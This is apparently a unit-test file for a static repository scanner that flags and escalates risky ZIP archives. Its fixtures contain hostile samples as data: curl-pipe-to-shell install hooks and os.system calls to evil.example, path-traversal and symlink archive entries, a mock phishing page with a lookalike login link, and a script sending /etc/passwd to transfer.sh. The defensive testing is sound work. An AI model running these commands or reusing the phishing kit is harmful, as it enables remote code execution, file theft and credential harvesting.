import contextlib
import json
import shutil
import sys
import unittest
import uuid
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
RUNTIME_TMP = ROOT / "tests" / "__runtime_tmp_maya_lens_scanner"
sys.path.insert(0, str(ROOT / "src"))

from maya_lens.report import render_html_report, render_markdown_report
from maya_lens.scanner import build_security_routing, parse_dependencies, scan_zip


class MayaLensScannerTests(unittest.TestCase):
    @contextlib.contextmanager
    def _workspace_tmp(self):
        RUNTIME_TMP.mkdir(parents=True, exist_ok=True)
        path = RUNTIME_TMP / f"tmp_{uuid.uuid4().hex}"
        path.mkdir(parents=True, exist_ok=False)
        try:
            yield str(path)
        finally:
            shutil.rmtree(path, ignore_errors=True)

    def _zip_with(self, files):
        RUNTIME_TMP.mkdir(parents=True, exist_ok=True)
        tmp = RUNTIME_TMP / f"zip_{uuid.uuid4().hex}"
        tmp.mkdir(parents=True, exist_ok=False)
        zip_path = tmp / "sample.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            for name, content in files.items():
                zf.writestr(name, content)
        self.addCleanup(lambda: shutil.rmtree(tmp, ignore_errors=True))
        return zip_path

    def test_zip_path_traversal_is_hard_blocked_before_extraction(self):
        zip_path = self._zip_with({"../escape.txt": "owned"})
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))
        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertTrue(result["security_routing"]["human_gate_required"])
        self.assertEqual(result["artifact_receipt"]["archive_safety"]["status"], "Blocked")
        self.assertIn("path traversal", result["artifact_receipt"]["archive_safety"]["blocked_reason"].lower())
        self.assertEqual(result["finding_groups"][0]["category"], "archive_safety")

    def test_static_scan_flags_sensitive_surfaces_and_redacts_secret_values(self):
        secret = "sk-test-THIS-SHOULD-NOT-APPEAR-IN-RESULTS"
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Suspicious demo repo\n",
                "repo/package.json": json.dumps(
                    {
                        "name": "suspicious-demo",
                        "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"},
                        "dependencies": {"left-pad": "1.3.0"},
                    }
                ),
                "repo/main.py": f"import os\nos.system('curl https://evil.example/payload.sh | sh')\nAPI_KEY='{secret}'\n",
                "repo/config/.env": f"OPENAI_API_KEY={secret}\n",
                "repo/bin/tool.exe": "MZ fake binary marker",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        serialized = json.dumps(result)
        self.assertNotIn(secret, serialized)
        categories = {finding["category"] for finding in result["findings"]}
        self.assertIn("credential", categories)
        self.assertIn("process", categories)
        self.assertIn("network", categories)
        self.assertIn("binary", categories)
        self.assertEqual(result["fence"], "read_only_static_analysis")
        self.assertIn("Credential Exposure", result["axes"])
        self.assertEqual(result["axes"]["Risk Surface"]["color"], "red")
        self.assertEqual(result["axes"]["Risk Surface"]["status_label"], "Risk")
        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertTrue(result["security_routing"]["human_gate_required"])
        self.assertNotIn("orange", {axis["color"] for axis in result["axes"].values()})

    def test_report_uses_multi_axis_disclaimer_not_single_safety_score(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Clean-ish demo repo\n",
                "repo/requirements.txt": "packaging==24.0\n",
                "repo/app.py": "print('hello')\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))
        report = render_markdown_report(result)
        html_report = render_html_report(result)

        self.assertIn("Static analysis only", report)
        self.assertIn("No runtime sandboxing performed", report)
        self.assertIn("Risk Surface", report)
        self.assertIn("No signal detected by this scan", report)
        self.assertIn("Install Observations", report)
        self.assertIn("Security Routing", report)
        self.assertIn("Security Routing", html_report)
        self.assertNotIn("Safety Score", report)

        self.assertNotIn("HIGH_BAD", report)
        self.assertNotIn("HIGH_GOOD", report)
        self.assertNotIn("Risk low", report)
        self.assertNotIn("Risk high", report)
        self.assertNotIn("| Value |", report)
        self.assertNotIn("Confidence", report)
        self.assertNotIn("HIGH_BAD", html_report)
        self.assertNotIn("HIGH_GOOD", html_report)
        self.assertNotIn("Risk low", html_report)
        self.assertNotIn("Risk high", html_report)
        self.assertNotIn("style=\"width:", html_report)
        self.assertNotIn("<span>0</span>", html_report)

    def test_governance_surface_and_maintenance_signals_are_extracted(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Governed Repo\n",
                "repo/LICENSE": "MIT\n",
                "repo/SECURITY.md": "Please report vulnerabilities privately.\n",
                "repo/CONTRIBUTING.md": "Open a PR after running tests.\n",
                "repo/CHANGELOG.md": "## 0.2.0\n- Added policy previews\n",
                "repo/.github/CODEOWNERS": "* @maya-team\n",
                "repo/.github/ISSUE_TEMPLATE/bug_report.md": "Bug report template\n",
                "repo/.github/workflows/release.yml": "name: release\non: [push]\n",
                "repo/.github/workflows/publish-docs.yml": "name: publish docs\non: [push]\n",
                "repo/docs/APPROVAL_ROUTING.md": "Approval routing lives here.\n",
                "repo/docs/CI_POLICY.md": "CI policy and review gates.\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))
        report = render_markdown_report(result)
        html_report = render_html_report(result)

        governance = result["governance_surface"]
        counts = governance["counts"]
        self.assertGreaterEqual(counts["approval_docs"], 2)
        self.assertGreaterEqual(counts["security_policy_files"], 1)
        self.assertGreaterEqual(counts["contributing_guides"], 1)
        self.assertGreaterEqual(counts["changelog_files"], 1)
        self.assertGreaterEqual(counts["release_workflows"], 1)
        self.assertGreaterEqual(counts["docs_workflows"], 1)
        self.assertGreaterEqual(counts["issue_templates"], 1)
        self.assertGreaterEqual(counts["codeowners_files"], 1)
        self.assertEqual(result["axes"]["Maintenance Health"]["color"], "green")
        self.assertIn("Governance / Approval Surface", report)
        self.assertIn("Governance / Approval Surface", html_report)
        self.assertIn("APPROVAL_ROUTING.md", report)
        self.assertIn("publish docs", report)

    def test_design_pack_assets_and_css_segments_do_not_create_red_risk(self):
        zip_path = self._zip_with(
            {
                "pack/readtheroom-premium-cockpit.html": """
<!doctype html><html><head>
<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">
<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>
<link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap\" rel=\"stylesheet\">
<style>.segments{display:flex}.hero{background-image:url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E\")}</style>
</head><body><div class=\"segments\"><button>balanced</button></div></body></html>
""",
                "pack/readtheroom-premium-cockpit.png": b"\x89PNG\r\n\x1a\n",
                "pack/notes.md": "# Design pack\nhttps://example.com/reference-only\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        categories = {finding["category"] for finding in result["findings"]}
        self.assertNotIn("intrusiveness", categories)
        self.assertNotIn("binary", categories)
        self.assertEqual(result["axes"]["Risk Surface"]["status_label"], "No signal detected by this scan")
        self.assertEqual(result["axes"]["Network Surface"]["status_label"], "No signal detected by this scan")
        self.assertEqual(result["axes"]["Provenance Signals"]["color"], "blue")
        self.assertEqual(result["axes"]["Maintenance Health"]["color"], "blue")
        self.assertNotIn("red", {axis["color"] for axis in result["axes"].values()})
        self.assertNotIn("amber", {axis["color"] for axis in result["axes"].values()})
    def test_security_reference_repo_uses_review_not_wall_of_red(self):
        deps = {f"pkg{i}": "1.0.0" for i in range(47)}
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Security scanner reference\nThis repo documents credential, exploit, network, and audit concepts.\nhttps://docs.example/security\n",
                "repo/package.json": json.dumps({"dependencies": deps}),
                "repo/package-lock.json": json.dumps({"dependencies": deps}),
                "repo/docs/API_KEYS.md": "Use API_KEY=demo in examples only.\n",
                "repo/docs/network.md": "Callbacks and webhooks are reviewed before runtime use. https://example.com/webhook\n",
                "repo/assets/screenshot.png": b"\x89PNG\r\n\x1a\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        axes = result["axes"]
        red_axes = {name for name, axis in axes.items() if axis["status_label"] == "Risk"}
        self.assertNotIn("Risk Surface", red_axes)
        self.assertNotIn("Install Observations", red_axes)
        self.assertNotIn("Dependency Risk", red_axes)
        self.assertNotIn("Network Surface", red_axes)
        self.assertNotIn("Storage Footprint", red_axes)
        self.assertEqual(axes["Risk Surface"]["status_label"], "Review")
        self.assertEqual(axes["Dependency Risk"]["status_label"], "Review")
        self.assertIn("reward_note", axes["Risk Surface"])
        self.assertIn("review_options", axes["Dependency Risk"])

    def test_malformed_urls_do_not_crash_static_scan(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# URL parser edge case\n",
                "repo/app.js": "const weird = 'http://[not-a-valid-ipv6-url';\nconsole.log(weird);\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))
        self.assertEqual(result["version"], "0.2.0")
        self.assertIn(result["status"], {"No signal detected by this scan", "Review"})

    def test_repo_brief_v02_builds_ai_bom_receipt_groups_and_remediation(self):
        zip_path = self._zip_with(
            {
                "repo/AGENTS.md": "# Agent rules\nDo not run tools without permission.\n",
                "repo/mcp.json": json.dumps({"servers": {"demo": {"command": "python", "args": ["server.py"]}}}),
                "repo/.github/workflows/scan.yml": "name: scan\non: [push]\n",
                "repo/package.json": json.dumps(
                    {
                        "name": "agent-bom-demo",
                        "scripts": {"postinstall": "node scripts/install.js"},
                        "dependencies": {"@modelcontextprotocol/sdk": "1.0.0"},
                    }
                ),
                "repo/scanner/report.py": "print('scan')\n",
                "repo/README.md": "# Agent BOM Demo\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        self.assertEqual(result["version"], "0.2.0")
        self.assertEqual(result["ai_bom"]["version"], "maya_ai_component_bom_v0_2")
        component_types = result["ai_bom"]["component_type_counts"]
        self.assertGreaterEqual(component_types.get("agent_instruction", 0), 1)
        self.assertGreaterEqual(component_types.get("mcp_server", 0), 1)
        self.assertGreaterEqual(component_types.get("workflow_automation", 0), 1)
        self.assertEqual(result["artifact_receipt"]["version"], "maya_repo_artifact_receipt_v0_2")
        self.assertEqual(result["artifact_receipt"]["executed_repo_code"], False)
        self.assertIn("security_routing", result)
        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertEqual(result["advisory_triage"]["urgency"], "Risk")
        self.assertEqual(result["advisory_triage"]["owner"], "Manual safety review")
        self.assertGreaterEqual(result["agentic_surface"]["component_counts"].get("mcp_server", 0), 1)
        self.assertEqual(result["agentic_surface"]["posture"], "Risk")
        self.assertTrue(result["finding_groups"])

        report = render_markdown_report(result)
        html_report = render_html_report(result)
        self.assertIn("AI / Component BOM", report)
        self.assertIn("Artifact Receipt", report)
        self.assertIn("Remediation Plan", report)
        self.assertIn("Advisory Triage", report)
        self.assertIn("Agentic / MCP Surface", report)
        self.assertIn("AI / Component BOM", html_report)
        self.assertIn("Advisory Triage", html_report)

    def test_public_reports_ignore_unrecognized_metadata(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Public language fixture\n",
                "repo/package.json": json.dumps({"scripts": {"postinstall": "node install.js"}}),
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        result["advisory_triage"]["private_metadata"] = "non-public sentinel"
        result["agentic_surface"]["private_metadata"] = "non-public sentinel"

        report = render_markdown_report(result)
        html_report = render_html_report(result)
        combined = report + "\n" + html_report

        self.assertNotIn("non-public sentinel", combined)
        self.assertIn("MAYA policy review", combined)
        self.assertIn("Manual safety review", combined)
        self.assertIn("Recommended review path", combined)
        self.assertIn("recommended review", combined.lower())
        self.assertIn("Reuse Indicators", combined)
        self.assertNotIn("MAYA Fit / Usefulness", combined)

    def test_public_homepage_copy_is_product_focused(self):
        index = (ROOT / "web" / "index.html").read_text(encoding="utf-8")
        self.assertIn("MAYA Repo Brief v0.2", index)
        self.assertIn("no cloud upload", index)
        self.assertIn("Reader-friendly", index)

    def test_browse_zip_uses_visible_semantic_button_with_hidden_input_out_of_tab_order(self):
        index = (ROOT / "web" / "index.html").read_text(encoding="utf-8")
        styles = (ROOT / "web" / "styles.css").read_text(encoding="utf-8")
        app_js = (ROOT / "web" / "app.js").read_text(encoding="utf-8")

        self.assertIn('id="zipInput" class="file-input"', index)
        self.assertIn('tabindex="-1" aria-label="Repository ZIP file chooser"', index)
        self.assertIn('id="browseButton" class="file-browse-button" type="button"', index)
        self.assertIn('aria-label="Choose a repository ZIP file"', index)
        self.assertIn(".file-input", styles)
        self.assertIn(".file-browse-button:focus-visible", styles)
        self.assertIn("browse.addEventListener('click', () => input.click())", app_js)
        self.assertIn("event.target.closest('#browseButton')", app_js)

    def test_parse_dependencies_extracts_lockfile_and_build_manifests(self):
        zip_path = self._zip_with(
            {
                "repo/package.json": json.dumps(
                    {
                        "name": "demo-suite",
                        "version": "0.1.0",
                        "dependencies": {"left-pad": "1.3.0", "chalk": "4.1.0"},
                    }
                ),
                "repo/package-lock.json": json.dumps(
                    {
                        "name": "demo-suite",
                        "version": "0.1.0",
                        "lockfileVersion": 3,
                        "dependencies": {
                            "left-pad": {"version": "1.3.0"},
                            "chalk": {"version": "4.1.0"},
                        },
                    }
                ),
                "repo/yarn.lock": """
left-pad@npm:^1.3.0:
  version "1.3.0"

chalk@npm:^4.1.0:
  version "4.1.0"

"@types/node@npm:^20.0.0":
  version "20.1.0"
""",
                "repo/pnpm-lock.yaml": """
packages:
  /@scope/kit@1.2.3:
    resolution: {integrity: sha512-demo}
""",
                "repo/pom.xml": """
                    <project>
                        <dependencies>
                            <dependency>
                                <groupId>org.apache.commons</groupId>
                                <artifactId>commons-lang3</artifactId>
                            </dependency>
                        </dependencies>
                    </project>
                """,
                "repo/build.gradle": """
                    plugins { id 'java' }
                    dependencies {
                        implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.9.0'
                    }
                """,
            }
        )

        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        receipt = result["artifact_receipt"]
        self.assertGreaterEqual(result["ai_bom"]["dependency_direct_count"], 6)
        self.assertGreaterEqual(receipt["lockfile_count"], 3)
        self.assertGreaterEqual(receipt["manifest_file_count"], 3)
        ecosystems = result["ai_bom"]["dependency_ecosystems"]
        self.assertGreaterEqual(ecosystems.get("npm", 0), 1)
        self.assertGreaterEqual(ecosystems.get("java", 0), 1)

        with self._workspace_tmp() as parse_root:
            with zipfile.ZipFile(zip_path) as zf:
                zf.extractall(parse_root)
            parsed = parse_dependencies(Path(parse_root), [])
        identities = {(item["ecosystem"], item["name"]) for item in parsed["dependencies"]}
        for expected in {
            ("npm", "left-pad"),
            ("npm", "chalk"),
            ("npm", "@types/node"),
            ("general", "@scope/kit"),
            ("java", "org.apache.commons:commons-lang3"),
            ("java", "org.jetbrains.kotlin:kotlin-stdlib"),
        }:
            self.assertIn(expected, identities)
        self.assertEqual(result["security_routing"]["decision"], "advisory_enrichment_review")

    def test_binary_artifact_repo_routes_to_deep_artifact_escalation(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Firmware-ish bundle\n",
                "repo/app.jar": b"PK\x03\x04binary-jar-demo",
                "repo/docs/notes.txt": "static only\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        self.assertEqual(result["security_routing"]["decision"], "deep_artifact_escalation")
        self.assertTrue(result["security_routing"]["human_gate_required"])

    def test_lockfile_dependency_overflow_is_guarded(self):
        deps = {f"pkg{i}": "1.0.0" for i in range(5000)}
        zip_path = self._zip_with(
            {
                "repo/package-lock.json": json.dumps({"dependencies": deps}),
                "repo/go.mod": "module demo\n\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        self.assertLessEqual(result["ai_bom"]["dependency_direct_count"], 3000)
        categories = {finding["category"] for finding in result["findings"]}
        self.assertIn("dependency", categories)




    def test_quarantine_source_path_forces_block_review(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# harmless shell\n",
                "repo/app.py": "print('hi')\n",
            }
        )
        renamed = zip_path.with_name("04_defensive_quarantine_demo.zip")
        renamed.write_bytes(zip_path.read_bytes())
        with self._workspace_tmp() as work:
            result = scan_zip(renamed, work_root=Path(work))

        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertTrue(result["security_routing"]["human_gate_required"])

    def test_reference_secret_examples_stay_in_advisory_lane(self):
        zip_path = self._zip_with(
            {
                "repo/package.json": json.dumps({
                    "name": "safe-ref",
                    "dependencies": {"left-pad": "1.0.0"},
                }),
                "repo/.env.example": "API_KEY=demo\n",
                "repo/src/client.py": "import requests\nrequests.get('https://example.com')\n",
            }
        )
        renamed = zip_path.with_name("security_graph_reference_demo.zip")
        renamed.write_bytes(zip_path.read_bytes())
        with self._workspace_tmp() as work:
            result = scan_zip(renamed, work_root=Path(work))

        self.assertEqual(result["security_routing"]["decision"], "advisory_enrichment_review")
        self.assertFalse(result["security_routing"]["human_gate_required"])

    def test_symlink_zip_returns_blocked_receipt_instead_of_crashing(self):
        RUNTIME_TMP.mkdir(parents=True, exist_ok=True)
        tmp = RUNTIME_TMP / f"zip_{uuid.uuid4().hex}"
        tmp.mkdir(parents=True, exist_ok=False)
        self.addCleanup(lambda: shutil.rmtree(tmp, ignore_errors=True))
        zip_path = tmp / "symlinked.zip"
        info = zipfile.ZipInfo("repo/AGENTS.md")
        info.create_system = 3
        info.external_attr = (0o120777 << 16)
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr(info, "../real-target")
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertEqual(result["artifact_receipt"]["archive_safety"]["status"], "Blocked")
        self.assertIn("symlink", result["artifact_receipt"]["archive_safety"]["blocked_reason"].lower())
        self.assertIn("archive_safety", {finding["category"] for finding in result["findings"]})
        self.assertEqual(result["advisory_triage"]["urgency"], "Risk")
        self.assertEqual(result["agentic_surface"]["posture"], "Risk")

    def test_action_boundary_review_promotes_bank_patterns_into_runtime_receipt(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# ActionBoundary demo\nThis agent can issue refunds, schedule payments, change a vendor bank account, grant access, edit customer records, and export data.\n",
                "repo/AGENTS.md": "# Agent instructions\nBefore executing tools, require explicit approval and preserve the audit receipt.\n",
                "repo/mcp.json": json.dumps({"servers": {"payments": {"command": "python", "args": ["server.py"]}}}),
                "repo/docs/APPROVAL_POLICY.md": "Approval policy: refunds, payments, bank changes, access grants, data export, and deletes require review.\n",
                "repo/src/actions.py": "def refund_customer():\n    pass\ndef export_customer_data():\n    pass\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        boundary = result["action_boundary_review"]
        class_ids = {item["id"] for item in boundary["authority_classes"]}
        self.assertEqual(boundary["version"], "maya_action_boundary_review_v0_1")
        self.assertTrue(boundary["manual_approval_required"])
        self.assertIn("financial_action", class_ids)
        self.assertIn("vendor_bank_change", class_ids)
        self.assertIn("access_control", class_ids)
        self.assertIn("data_export", class_ids)
        self.assertIn("record_modification", class_ids)
        self.assertIn("instruction_surface_integrity", boundary)
        self.assertEqual(boundary["instruction_surface_integrity"]["status"], "Review")
        self.assertEqual(result["status"], "Review")
        self.assertNotIn("pattern_sources", boundary)

        public_receipt = result["public_receipt"]
        self.assertEqual(public_receipt["version"], "maya_repo_brief_public_receipt_v0_2")
        self.assertTrue(public_receipt["static_only"])
        self.assertFalse(public_receipt["executed_repo_code"])
        self.assertIn("action_boundaries", public_receipt)
        self.assertIn("financial action", " ".join(public_receipt["action_boundaries"]).lower())
        serialized_receipt = json.dumps(public_receipt)
        self.assertNotIn("private_metadata", serialized_receipt)

        report = render_markdown_report(result)
        html_report = render_html_report(result)
        self.assertIn("Action Boundary Review", report)
        self.assertIn("Action Boundary Review", html_report)
        self.assertIn("Public Receipt", report)
        self.assertIn("financial action", report.lower())

    def test_security_tool_surface_requires_scope_for_agent_api_and_scanner_repos(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Scanner Pack\nGraphQL schema introspection, API endpoint discovery, MCP agent exposure, and port scan target review.\n",
                "repo/.github/workflows/security.yml": "name: security\njobs:\n  codeql:\n    steps:\n      - uses: github/codeql-action/init@v3\n      - uses: snyk/actions/node@master\n",
                "repo/mcp.json": json.dumps({"servers": {"local-llm": {"command": "ollama", "args": ["serve"]}}}),
                "repo/docs/USAGE.md": "Run recon only against authorized CIDR ranges. Never scan a target URL without approval.\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        surface = result["security_tool_surface"]
        self.assertEqual(surface["version"], "maya_security_tool_surface_v0_1")
        self.assertEqual(surface["posture"], "manual_scope_required")
        self.assertTrue(surface["human_scope_required"])
        self.assertGreater(surface["counts"]["ci_security_workflows"], 0)
        self.assertGreater(surface["counts"]["api_graphql_surface"], 0)
        self.assertGreater(surface["counts"]["mcp_agent_exposure_scan"], 0)
        self.assertGreater(surface["counts"]["live_target_scan"], 0)
        self.assertEqual(result["status"], "Review")

        public_receipt = result["public_receipt"]
        self.assertTrue(public_receipt["security_tool_surface"]["human_scope_required"])
        self.assertEqual(public_receipt["security_tool_surface"]["posture"], "manual_scope_required")
        self.assertIn("Require explicit target scope", "\n".join(public_receipt["recommended_actions"]))

        report = render_markdown_report(result)
        html_report = render_html_report(result)
        self.assertIn("Security Tool Surface", report)
        self.assertIn("Security Tool Surface", html_report)
        self.assertIn("manual_scope_required", report)

    def test_large_docs_like_repo_stays_in_advisory_lane_not_deep_artifact(self):
        inventory = {
            "file_count": 9000,
            "dir_count": 800,
            "total_bytes": 150 * 1024 * 1024,
            "total_mb": 150,
            "extensions": {".md": 6000, ".yaml": 900},
            "largest_files": [],
            "special": {"readme": True, "license": True, "git_metadata": False, "github_workflows": True},
        }
        deps = {
            "manifest_files": [],
            "lockfiles": [],
            "direct_count": 0,
            "dependencies": [],
            "install_hooks": [],
        }
        axes = {"Storage Footprint": {"value": 60}}
        metadata = {
            "repo_identity": "snyk/user-docs",
            "source_url": "https://github.com/snyk/user-docs",
            "readme_title": "Snyk User Docs",
        }
        findings = [
            {"category": "network", "severity": "medium", "path": ".gitbook/assets/openapi.yaml", "signal": "hardcoded URL", "snippet": "https://docs.example"},
            {"category": "credential", "severity": "high", "path": ".env.example", "signal": "secret-shaped value", "snippet": "API_KEY=[REDACTED]"},
        ]
        routing = build_security_routing(inventory, deps, findings, axes, metadata, "snyk__user-docs.zip")
        self.assertEqual(routing["decision"], "advisory_enrichment_review")
        self.assertFalse(routing["human_gate_required"])

    def test_phishing_campaign_pattern_is_flagged_and_escalated(self):
        # Reproduction of the 2026-08-15 HERMES-TOKEN / hermes-agent.icu
        # phishing campaign: empty repo, mass-mention bait README, shortlink
        # funnel, lookalike domain impersonating the public Hermes Agent
        # project, and scam tracking stack on the fake landing surface.
        zip_path = self._zip_with(
            {
                "repo/README.md": (
                    "# Community Notice\n\n"
                    "Thank you for your activity and contributions on GitHub.\n"
                    "As part of our latest community review, we made additional information "
                    "available to a number of participating contributors.\n\n"
                    "[View contributor information](https://goo.su/LkV2UiR)\n"
                ),
                "repo/index.html": (
                    "<html><head>"
                    "<script async src=\"https://mc.yandex.ru/metrika/tag.js\"></script>"
                    "<script src=\"https://top-fwz1.mail.ru/js/code.js\"></script>"
                    "<script src=\"https://ads.digitalcaramel.com/caramel.js\"></script>"
                    "</head><body>"
                    "<h1>Hermes Agent — Contributor Portal</h1>"
                    "<p>Verify your account to claim your rewards.</p>"
                    "<a href=\"https://hermes-agent.icu/login\">Sign in to verify</a>"
                    "</body></html>"
                ),
                "repo/scripts/collect.sh": (
                    "#!/bin/sh\n"
                    "curl -s https://discord.com/api/webhooks/1234567890/ABCDEFGHIJKLMNOP > /tmp/hook\n"
                    "cat /tmp/hook && curl -F file=@/etc/passwd https://transfer.sh/passwd\n"
                ),
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        categories = {finding["category"] for finding in result["findings"]}
        self.assertIn("phishing", categories)
        signals = {finding["signal"] for finding in result["findings"] if finding["category"] == "phishing"}
        self.assertIn("shortlink hides destination", signals)
        self.assertIn("brand-impersonation lookalike host", signals)
        self.assertIn("yandex metrika on phishing surface", signals)
        self.assertIn("mail.ru counter", signals)
        self.assertIn("credential harvest language", signals)
        self.assertIn("discord webhook exfil", signals)
        self.assertIn("paste/transfer exfil", signals)

        self.assertIn("Phishing Surface", result["axes"])
        # Brand-impersonation + shortlink in HTML/code are live high signals.
        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "red")
        self.assertEqual(result["axes"]["Phishing Surface"]["status_label"], "Risk")
        # Multiple phishing signals co-occurring with execution surface must escalate.
        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
        self.assertTrue(result["security_routing"]["human_gate_required"])

    def test_phishing_docs_references_stay_advisory_not_red(self):
        # A README that merely *documents* phishing concepts (a security
        # reference repo) must not turn the whole scan red.
        zip_path = self._zip_with(
            {
                "repo/README.md": (
                    "# Phishing detection toolkit\n\n"
                    "This repo helps you detect phishing. It discusses shortlinks like "
                    "https://bit.ly/abc123 and lookalike domains, plus credential harvesting. See "
                    "https://www.example.com/blog for details.\n"
                ),
                "repo/LICENSE": "MIT\n",
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))

        categories = {finding["category"] for finding in result["findings"]}
        # Docs-only shortlink reference may surface as phishing but at low severity.
        phishing_findings = [f for f in result["findings"] if f["category"] == "phishing"]
        self.assertTrue(all(f["severity"] == "low" for f in phishing_findings))
        # Docs/readme references must not create red risk or block routing.
        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "blue")
        self.assertNotEqual(result["security_routing"]["decision"], "block_review_before_any_run")

    def test_legit_repo_without_phishing_surface_stays_clean(self):
        zip_path = self._zip_with(
            {
                "repo/README.md": "# Normal library\n",
                "repo/LICENSE": "MIT\n",
                "repo/app.py": "import requests\nresp = requests.get('https://api.example.com/v1/data')\nprint(resp.status_code)\n",
                "repo/package.json": json.dumps({"name": "normal-lib", "version": "1.0.0"}),
            }
        )
        with self._workspace_tmp() as work:
            result = scan_zip(zip_path, work_root=Path(work))
        phishing_findings = [f for f in result["findings"] if f["category"] == "phishing"]
        self.assertEqual(phishing_findings, [])
        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "green")
        self.assertEqual(result["axes"]["Phishing Surface"]["status_label"], "No signal detected by this scan")


if __name__ == "__main__":
    unittest.main()
